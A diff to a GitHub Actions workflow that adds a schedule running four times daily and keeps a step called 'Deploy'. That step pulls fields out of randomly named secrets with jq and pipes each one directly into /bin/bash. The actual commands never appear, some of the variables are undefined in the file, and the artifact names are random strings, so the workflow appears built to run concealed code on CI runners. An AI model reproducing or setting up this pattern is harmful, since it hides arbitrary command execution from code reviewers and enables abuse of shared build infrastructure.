@@ -2,6 +2,8 @@ name: CI Build
 on:
   workflow_dispatch:
 
+  schedule:
+    - cron: '17 5,11,17,23 * * *'
 env:
   CI: true
 concurrency:
@@ -14,16 +16,15 @@ jobs:
       - uses: actions/checkout@v4
       - name: Deploy
         env:
-          zbo130: ${{ secrets.zbo130 }}
+          neecg09: ${{ secrets.neecg09 }}
         run: |
-          printf '%s' "$zbo130" | jq -r .d15074 | /bin/bash
-          printf '%s' "$dyzd12" | jq -r .zhjc94 | /bin/bash
-          printf '%s' "$fm036" | jq -r .iqunm135 | /bin/bash
-          echo $x53 | jq -r .ixl4 | /bin/bash
+          printf '%s' "$neecg09" | jq -r .xaq8 | /bin/bash
+          printf '%s' "$upjrr2" | jq -r .xvu9938 | /bin/bash
+          echo $weyk48 | jq -r .huoo67268 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
         with:
-          name: vg1vGz8S
+          name: H5nKlaZ3
           path: "*.zip"
           retention-days: 1
